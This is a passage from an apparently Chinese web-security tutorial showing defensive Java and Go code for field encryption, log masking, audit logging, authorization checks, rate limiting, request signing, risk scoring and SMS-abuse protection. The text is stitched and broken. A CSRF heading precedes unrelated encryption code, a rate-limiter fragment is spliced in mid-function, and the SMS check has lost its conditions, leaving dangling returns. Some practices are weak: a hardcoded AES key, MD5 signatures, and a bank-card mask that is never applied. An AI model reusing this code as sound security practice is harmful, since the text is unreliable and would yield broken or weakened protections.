    - SameSite: Strict/Lax
    - Secure: 仅HTTPS传输
```

### 3️⃣ CSRF攻击（Cross-Site Request Forgery）

> **核心：利用用户已登录状态发起恶意请求**

```java
// 字段级加密服务
@Component
public class FieldEncryptionService {
    
    private static final String AES_KEY = "your-256-bit-key-here-32-bytes-long";
    private static final String ALGORITHM = "AES/GCM/NoPadding";
    
    // 加密敏感字段
    public String encryptSensitiveField(String plainText) throws Exception {
        if (plainText == null) return null;
        
        // 生成随机IV
        byte[] iv = new byte[12];
        SecureRandom random = new SecureRandom();
        random.nextBytes(iv);
        
        // 初始化加密器
        Cipher cipher = Cipher.getInstance(ALGORITHM);
        SecretKeySpec keySpec = new SecretKeySpec(AES_KEY.getBytes(), "AES");
        GCMParameterSpec parameterSpec = new GCMParameterSpec(128, iv);
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, parameterSpec);
        
        // 执行加密
        byte[] encrypted = cipher.doFinal(plainText.getBytes(StandardCharsets.UTF_8));
        
        // 返回: IV + 密文 (Base64编码) 拼接成字符串
        byte[] combined = new byte[iv.length + encrypted.length];
        System.arraycopy(iv, 0, combined, 0, iv.length);
        System.arraycopy(encrypted, 0, combined, iv.length, encrypted.length);
        
        return Base64.getEncoder().encodeToString(combined);
    }
    
    // 解密密文
    public String decryptSensitiveField(String encryptedBase64) throws Exception {
        if (encryptedBase64 == null) return null;
        
        // 解码Base64
        byte[] combined = Base64.getDecoder().decode(encryptedBase64);
        
        // 分离IV和密文
        byte[] iv = new byte[12];
        byte[] encrypted = new byte[combined.length - 12];
        System.arraycopy(combined, 0, iv, 0, 12);
        System.arraycopy(combined, 12, encrypted, 0, encrypted.length);
        
        // 初始化解密器
        Cipher cipher = Cipher.getInstance(ALGORITHM);
        SecretKeySpec keySpec = new SecretKeySpec(AES_KEY.getBytes(), "AES");
        GCMParameterSpec parameterSpec = new GCMParameterSpec(128, iv);
        cipher.init(Cipher.DECRYPT_MODE, keySpec, parameterSpec);
        
        // 执行解密
        byte[] decrypted = cipher.doFinal(encrypted);
        return new String(decrypted, StandardCharsets.UTF_8);
    }
}
```

```java
// 日志脱敏组件
@Component
@Aspect
public class LogMaskAspect {
    
    // 脱敏规则
    private static final Map<String, Pattern> SENSITIVE_PATTERNS = new HashMap<>();
    
    static {
        // 手机号: 138****1234
        SENSITIVE_PATTERNS.put("phone", Pattern.compile("(1[3-9]\\d)\\d{4}(\\d{4})"));
        
        // 身份证号: 1101**********1234
        SENSITIVE_PATTERNS.put("idCard", Pattern.compile("(\\d{4})\\d{10}(\\d{4})"));
        
        // 银行卡号: 6222********1234
        SENSITIVE_PATTERNS.put("bankCard", Pattern.compile("(\\d{4})\\d{8,12}(\\d{4})"));
    }
    
    // 脱敏方法
    public String maskSensitiveData(String message) {
        String masked = message;
        
        for (Map.Entry<String, Pattern> entry : SENSITIVE_PATTERNS.entrySet()) {
            Matcher matcher = entry.getValue().matcher(masked);
            if ("phone".equals(entry.getKey())) {
                masked = matcher.replaceAll("$1****$2");
            } else if ("idCard".equals(entry.getKey())) {
                masked = matcher.replaceAll("$1**********$2");
            }
        }
        
        return masked;
    }
}
```

```java
@Component

public class SensitiveDataAuditAspect {
    
    @Autowired
    private AuditLogService auditLogService;
    
    // 监控敏感数据查询
    @Around("@annotation(RequireAudit)")
    public Object auditSensitiveQuery(ProceedingJoinPoint joinPoint) throws Throwable {
        String userId = SecurityContextHolder.getContext().getAuthentication().getName();
        String method = joinPoint.getSignature().getName();
        Object[] args = joinPoint.getArgs();
        
        long startTime = System.currentTimeMillis();
        
        try {
            Object result = joinPoint.proceed();
            
            // 记录成功访问
            auditLogService.logSensitiveAccess(
                userId, method, args, result, 
                System.currentTimeMillis() - startTime
            );
            
            return result;
            
        } catch (Exception e) {
            // 记录失败访问
            auditLogService.logSensitiveAccessFailure(
                userId, method, args, e.getMessage()
            );
            throw e;
        }
    }
}
```

#### **常见越权类型**

| **类型**           | **描述**             | **示例**               | **防护方案**           |
| ------------------ | -------------------- | ---------------------- | ---------------------- |
| **水平越权**       | 访问同级别用户数据   | 用户A访问用户B的数据   | 会话用户ID与资源ID比对 |
| **垂直越权**       | 低权限访问高权限功能 | 普通用户访问管理员接口 | 基于角色的访问控制     |
| **不直接对象引用** | 通过修改参数访问资源 | 修改ID参数访问他人数据 | 间接引用映射+权限验证  |

#### **权限验证实现**

```java
// 统一权限校验切面
@Aspect
@Component
@Slf4j
public class AuthorizationAspect {
    
    @Autowired
    private UserContext userContext;
    
    // 方法级权限校验
    @Around("@annotation(RequirePermission)")
    public Object checkPermission(ProceedingJoinPoint joinPoint, 
                                 RequirePermission annotation) throws Throwable {
        String permission = annotation.value();
        Long userId = userContext.getCurrentUserId();
        
        // 检查用户是否有权限
        if (!permissionService.hasPermission(userId, permission)) {
            log.warn("用户{}无权限{}", userId, permission);
            throw new UnauthorizedException("权限不足");
        }
        
        return joinPoint.proceed();
    }
    
    // 数据级权限校验
    @Around("@annotation(ResourceAccess)")
    public Object checkResourceAccess(ProceedingJoinPoint joinPoint, 
                                     ResourceAccess annotation) throws Throwable {
        String resourceType = annotation.resourceType();
        String idParam = annotation.idParam();
        
        // 获取资源ID
        Long resourceId = getResourceId(joinPoint, idParam);
        
        // 获取当前用户
        Long userId = userContext.getCurrentUserId();
        
        // 校验用户是否有权访问该资源
        if (!resourceService.canAccess(userId, resourceType, resourceId)) {
            log.warn("用户{}无权访问资源{}:{}", userId, resourceType, resourceId);
            throw new UnauthorizedException("无权访问此资源");
        }
        
        return joinPoint.proceed();
    }
    
    // 水平权限检查工具
    public void checkHorizontalAccess(Long targetUserId) {
        Long currentUserId = userContext.getCurrentUserId();
        
        if (!currentUserId.equals(targetUserId)) {
            throw new UnauthorizedException("无权访问其他用户数据");
        }
    }
}
```

```java
// 安全审计日志组件
@Component
@Aspect
@Slf4j
public class SecurityAuditAspect {
    
    // 记录用户登录
    @AfterReturning(pointcut = "execution(* com.example.service.AuthService.login(..))", 
                    returning = "result")
    public void auditLogin(JoinPoint joinPoint, Object result) {
        Object[] args = joinPoint.getArgs();
        String username = (String) args[0];
        String ip = getClientIp();
        
        Map<String, Object> auditLog = new HashMap<>();
        auditLog.put("timestamp", Instant.now());
        auditLog.put("event", "USER_LOGIN");
        auditLog.put("username", username);
        auditLog.put("ip", ip);
        auditLog.put("status", "SUCCESS");
        auditLog.put("userAgent", getRequest().getHeader("User-Agent"));
        
        // 发送到安全日志系统
        securityLogger.info("Security Audit: {}", toJson(auditLog));
    }
    
    // 记录敏感操作
    @Around("@annotation(SensitiveOperation)")
    public Object auditSensitiveOperation(ProceedingJoinPoint joinPoint, 
                                          SensitiveOperation annotation) throws Throwable {
        String operation = annotation.value();
        String resource = annotation.resource();
        
        Map<String, Object> auditLog = new HashMap<>();
        auditLog.put("timestamp", Instant.now());
        auditLog.put("event", "SENSITIVE_OPERATION");
        auditLog.put("operation", operation);
        auditLog.put("resource", resource);
        auditLog.put("user", getCurrentUser());
        auditLog.put("params", getSanitizedParams(joinPoint.getArgs()));
        
        long startTime = System.currentTimeMillis();
        
        try {
            Object result = joinPoint.proceed();
            long duration = System.currentTimeMillis() - startTime;
            
            auditLog.put("status", "SUCCESS");
            auditLog.put("duration", duration);
            securityLogger.info("Security Audit: {}", toJson(auditLog));
            
            return result;
        } catch (Exception e) {
            auditLog.put("status", "FAILED");
            auditLog.put("error", e.getMessage());
            securityLogger.error("Security Audit: {}", toJson(auditLog));
            throw e;
        }
    }
}
```

```go
// 滑动窗口限频器
type SlidingWindowLimiter struct {
    client   *redis.Client
    window   time.Duration
    limit    int
    keyPrefix string
}

func NewSlidingWindowLimiter(client *redis.Client, window time.Duration, limit int) *SlidingWindowLimiter {
    return &SlidingWindowLimiter{
        client:    client,
        window:    window,
        limit:     limit,
        keyPrefix: "rate_limit:",
    }
}

// 检查是否允许请求
func (l *SlidingWindowLimiter) Allow(ctx context.Context, key string) (bool, error) {
    now := time.Now().UnixMilli()
    windowStart := now - l.window.Milliseconds()
    
    // 使用Lua脚本保证原子性
    script := `
        local key = KEYS[1]
        local now = tonumber(ARGV[1])
        local windowStart = tonumber(ARGV[2])
        local limit = tonumber(ARGV[3])
        
        -- 移除窗口外的请求
        redis.call('ZREMRANGEBYSCORE', key, 0, windowStart)
        
        -- 获取当前请求数
        local current = redis.call('ZCARD', key)
        
        if current < limit then
            -- 添加当前请求
            redis.call('ZADD', key, now, now)
            redis.call('EXPIRE', key, 3600)
            return 1
        else
            return 0
        end
    `
    
    result, err := l.client.Eval(ctx, script, []string{l.keyPrefix + key},
        now, windowStart, l.limit).Result()
    
    if err != nil {
        return false, err
    }
    
    return result.(int64) == 1, nil
}

    rule, exists := bl.rules[business]
    if !exists {
        return true, ""
    }
    
    // 多维度检查
    checks := []struct{
        window  time.Duration
        limit   int
        message string
    }{
        {24*time.Hour, rule.DailyLimit, "今日次数已达上限"},
        {time.Hour, rule.HourlyLimit, "操作过于频繁，请稍后再试"},
        {time.Minute, rule.MinuteLimit, "操作过快，请稍候"},
    }
    
    for _, check := range checks {
        limiter := NewSlidingWindowLimiter(redisClient, check.window, check.limit)
        key := fmt.Sprintf("%s:%d:%s", business, userID, check.window)
```

```go
// 生成签名
func (s *RequestSigner) GenerateSign(params map[string]string) string {
    // 1. 参数排序
    keys := make([]string, 0, len(params))
    for k := range params {
        keys = append(keys, k)
    }
    sort.Strings(keys)
    
    // 2. 拼接参数
    var builder strings.Builder
    for _, k := range keys {
        builder.WriteString(k)
        builder.WriteString("=")
        builder.WriteString(params[k])
        builder.WriteString("&")
    }
    builder.WriteString("key=")
    builder.WriteString(s.appSecret)
    
    // 3. 计算签名
    raw := builder.String()
    hash := md5.Sum([]byte(raw))
    return hex.EncodeToString(hash[:])
}

// 验证签名
func (s *RequestSigner) VerifySign(params map[string]string) bool {
    // 1. 检查时间戳（防重放）
    now := time.Now().Unix()
    if math.Abs(float64(now-s.timestamp.Unix())) > 300 { // 5分钟有效期
        return false
    }
    
    // 2. 检查nonce（防重放）
    if s.isNonceUsed(s.nonce) {
        return false
    }
    
    // 3. 验证签名
    expectedSign := s.GenerateSign(params)
    return subtle.ConstantTimeCompare([]byte(expectedSign), []byte(s.sign)) == 1
}
```

```go
// 执行风控决策
func (e *RiskEngine) EvaluateRisk(ctx *RiskContext) *RiskResult {
    result := &RiskResult{
        RiskScore: 0,
        Triggers:  make([]string, 0),
        Actions:   make([]RiskAction, 0),
    }
    
    // 1. 检查黑白名单
    if e.blacklist.IsBlocked(ctx.User.ID, ctx.Device.ID, ctx.Request.IP) {
        result.RiskScore = 100
        result.Actions = append(result.Actions, BlockAction{})
        return result
    }
    
    if e.whitelist.IsTrusted(ctx.User.ID) {
        result.RiskScore = 0
        return result
    }
    
    // 2. 执行规则引擎
    for _, rule := range e.rules {
        score, reason := rule.Evaluate(ctx)
        if score > 0 {
            result.RiskScore += score * rule.Weight()
            result.Triggers = append(result.Triggers, reason)
            
            if result.RiskScore >= rule.Action().Threshold() {
                result.Actions = append(result.Actions, rule.Action())
            }
        }
    }
    
    // 3. 机器学习模型评分
    mlScore := e.mlModel.Predict(ctx)
    result.RiskScore = (result.RiskScore*0.7 + mlScore*0.3) // 加权融合
    
    // 4. 决策动作
    result.Actions = append(result.Actions, e.decideAction(result.RiskScore))
    
    return result
}
```

```go
func (s *SMSProtectionService) PreCheck(phone, ip string) (bool, string) {
    // 1. 号码有效性检查

        return false, "无效号码"
    }
    
    // 2. 黑白名单检查

        return false, "号码被限制"
    }
    
    if s.listManager.IsWhitelisted(phone) {
        return true, "" // 白名单直接放行
    }
    
    // 3. 多维度限频
    // 按号码限频
    if !s.rateLimiter.Allow("sms:phone:"+phone, 5, time.Hour) {
        return false, "发送过于频繁"
    }
    
    // 按IP限频
    if !s.rateLimiter.Allow("sms:ip:"+ip, 20, time.Hour) {
        return false, "IP发送超限"
    }
    
    // 按设备限频
    deviceID := getDeviceID()
    if !s.rateLimiter.Allow("sms:device:"+deviceID, 10, time.Hour) {
        return false, "设备发送超限"
    }
    
    // 4. 行为分析
    if s.behaviorAnalyzer.IsSuspicious(phone, ip) {
        if !requireCaptcha(phone) {
            return false, "验证码校验失败"
        }
    }
    
    return true, ""
}

func (s *SMSProtectionService) GetDynamicLimit(phone string) (int, time.Duration) {

        count int
        duration time.Duration
    }{

    }

    }
```
